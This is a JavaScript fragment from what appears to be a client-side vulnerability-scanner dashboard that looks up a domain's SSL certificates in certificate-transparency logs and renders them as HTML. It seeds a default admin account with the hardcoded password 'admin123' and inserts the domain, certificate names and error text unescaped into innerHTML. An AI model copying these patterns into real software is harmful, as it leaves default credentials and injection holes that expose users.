      el.innerHTML = `<div style="padding:12px;background:rgba(234,179,8,.07);border:1px solid rgba(234,179,8,.2);border-radius:8px;margin-top:8px;font-size:12.5px">
        <div style="color:var(--yellow);font-weight:700;margin-bottom:6px">⏳ Rate limited by Certspotter API</div>
        <div style="color:var(--text3);font-size:12px;margin-bottom:8px">Anonymous users get 100 requests/hour. Check manually:</div>
        <a href="https://crt.sh/?q=${encodeURIComponent(domain)}" target="_blank" style="color:var(--cyan);font-size:12px">↗ View on crt.sh</a> &nbsp;·&nbsp;
        <a href="https://www.ssllabs.com/ssltest/analyze.html?d=${encodeURIComponent(domain)}" target="_blank" style="color:var(--cyan);font-size:12px">↗ SSL Labs Test</a>
      </div>`;
      return;
    }
    if (!res.ok) throw new Error('API returned ' + res.status);
    const certs = await res.json();
    if (!Array.isArray(certs) || !certs.length) {
      el.innerHTML = `<div style="padding:12px;background:rgba(255,255,255,.04);border-radius:8px;margin-top:8px;border:1px solid var(--border);font-size:12.5px">
        <div style="color:var(--yellow);font-weight:700;margin-bottom:6px">⚠️ No certificates found in CT logs for <span style="font-family:var(--mono)">${domain}</span></div>
        <div style="font-size:12px;color:var(--text3)">This could mean the domain has no SSL cert, uses a private CA, or is very new.</div>
        <a href="https://crt.sh/?q=${encodeURIComponent(domain)}" target="_blank" style="font-size:12px;color:var(--cyan);display:inline-block;margin-top:8px">↗ Check manually on crt.sh</a>
      </div>`;
      return;
    }
    // Sort newest first by id (certspotter returns newest last, reverse)
    const sorted = [...certs].reverse().slice(0, 5);
    const now = Date.now();
    el.innerHTML = `<div style="padding:10px;background:rgba(255,255,255,.04);border-radius:8px;margin-top:8px;border:1px solid var(--border);font-size:12.5px">
      <div style="font-size:10px;color:var(--text3);margin-bottom:10px;font-weight:700;text-transform:uppercase;letter-spacing:.06em">
        📜 CT Log Results — <span style="color:var(--cyan)">${domain}</span> — ${certs.length} cert${certs.length !== 1 ? 's' : ''} found
      </div>
      ${sorted.map(cert => {
      const notAfter = cert.cert?.not_after ? new Date(cert.cert.not_after) : null;
      const notBefore = cert.cert?.not_before ? new Date(cert.cert.not_before) : null;
      const daysLeft = notAfter ? Math.round((notAfter - now) / 86400000) : null;
      const expired = daysLeft !== null && daysLeft < 0;
      const soon = daysLeft !== null && daysLeft >= 0 && daysLeft < 30;
      const statusColor = expired ? 'var(--red)' : soon ? 'var(--orange)' : 'var(--green)';
      const statusIcon = expired ? '❌ Expired' : soon ? '⚠️ Expiring soon' : '✅ Valid';
      const issuer = cert.issuer?.friendly_name || cert.issuer?.name || 'Unknown CA';
      const names = (cert.dns_names || []).slice(0, 4);
      return `<div style="padding:9px;margin-bottom:8px;background:rgba(0,0,0,.2);border-radius:8px;border:1px solid var(--border)">
          <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:5px">
            <span style="font-family:var(--mono);font-size:11px;color:var(--cyan);overflow:hidden;text-overflow:ellipsis;max-width:200px">${names[0] || domain}</span>
            <span style="color:${statusColor};font-size:11px;font-weight:700;flex-shrink:0">${statusIcon}</span>
          </div>
          ${names.length > 1 ? `<div style="font-size:10px;color:var(--text3);margin-bottom:4px">SANs: ${names.slice(1).map(n => `<span style="color:var(--text2)">${n}</span>`).join(', ')}${cert.dns_names?.length > 4 ? ` +${cert.dns_names.length - 4} more` : ''}
          </div>` : ''}
          <div style="font-size:10.5px;color:var(--text3)">🏢 Issuer: <span style="color:var(--text2)">${issuer}</span></div>
          ${notBefore && notAfter ? `<div style="font-size:10.5px;color:var(--text3);margin-top:3px">📅 ${notBefore.toLocaleDateString()} → ${notAfter.toLocaleDateString()}
            ${daysLeft !== null ? `<span style="color:${statusColor};font-weight:700;margin-left:6px">${expired ? '(expired)' : daysLeft + 'd left'}</span>` : ''}
          </div>` : ''}
          <div style="font-size:10px;color:var(--text3);margin-top:3px">🔢 ID: <span style="font-family:var(--mono);color:var(--text3)">${cert.id || 'N/A'}</span></div>
        </div>`;
    }).join('')}
      ${certs.length > 5 ? `<div style="font-size:11px;color:var(--text3);text-align:center;padding:4px 0">Showing 5 of ${certs.length} — <a href="https://crt.sh/?q=${encodeURIComponent(domain)}" target="_blank" style="color:var(--cyan)">see all on crt.sh ↗</a></div>` : ''}
    </div>`;
  } catch (e) {
    el.innerHTML = `<div style="padding:12px;background:rgba(239,68,68,.07);border:1px solid rgba(239,68,68,.2);border-radius:8px;margin-top:8px;font-size:12.5px">
      <div style="color:var(--red);font-weight:700;margin-bottom:6px">❌ SSL check failed</div>
      <div style="color:var(--text3);font-size:12px">${e.message}</div>
      <a href="https://crt.sh/?q=${encodeURIComponent(domain)}" target="_blank" style="font-size:12px;color:var(--cyan);display:inline-block;margin-top:8px">↗ Try manually on crt.sh</a>
    </div>`;
  }
}

// ==================== BOOT ====================
// Seed demo admin if no users
(function () {
  if (!state.users.find(u => u.username === 'admin')) {
    state.users.push({ username: 'admin', password: 'admin123', name: 'Admin', email: 'admin@vulnscan.local', role: 'admin' });
    save();
  }
})();

// Periodically verify user active status
setInterval(checkUserSession, 10000);